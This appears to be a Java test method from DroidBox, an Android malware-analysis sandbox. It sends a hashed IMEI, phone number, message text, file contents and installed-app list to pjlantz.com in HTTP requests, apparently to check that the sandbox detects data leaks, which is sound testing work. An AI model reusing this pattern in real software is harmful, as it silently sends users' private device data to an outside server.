    public void testNetworkHTTP() {
        Log.v("Test", "[*] testNetworkHTTP()");
        URL url = null;
        HttpURLConnection urlConnection = null;
        try {
            url = new URL("http://code.google.com/p/droidbox/");
            urlConnection = (HttpURLConnection) url.openConnection();
            BufferedReader rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            @SuppressWarnings("unused") String line = "";
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/imei.php?imei=" + hashedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/phone.php?phone=" + phoneNbr);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            url = new URL("http://pjlantz.com/file.php?file=" + fileContent.replace(" ", "+"));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL("http://pjlantz.com/app.php?installed=" + installedApps.replace(" ", "+"));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            urlConnection.disconnect();
        }
    }
